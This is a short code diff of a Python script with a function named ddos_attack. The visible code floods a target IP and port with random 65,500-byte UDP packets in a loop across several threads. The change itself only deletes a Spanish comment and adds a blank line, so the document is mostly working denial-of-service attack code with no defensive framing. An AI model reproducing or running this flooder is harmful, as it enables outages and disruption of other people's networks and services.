@@ -16,7 +16,6 @@ def ddos_attack(target_ip, target_port, duration):
 
     while duration is None or time.time() - start_time < duration:
         try:
-            # Datos aleatorios para variar el contenido
             data = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=65500)).encode()
             sock.sendto(data, (target_ip, target_port))
         except:
@@ -40,4 +39,5 @@ if __name__ == "__main__":
 
     for t in threads:
         t.join()
+
 
